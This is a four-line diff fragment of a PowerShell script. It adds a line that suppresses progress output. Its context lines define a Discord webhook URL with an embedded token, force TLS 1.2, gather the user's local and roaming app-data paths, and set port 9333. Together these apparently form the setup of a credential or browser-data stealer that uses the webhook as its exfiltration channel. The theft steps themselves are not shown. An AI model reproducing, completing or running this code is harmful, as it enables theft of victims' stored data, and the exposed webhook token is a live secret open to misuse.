@@ -1,3 +1,4 @@
+$ProgressPreference='SilentlyContinue'
 $hook='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 $la=$env:LOCALAPPDATA;$ad=$env:APPDATA;$port=9333
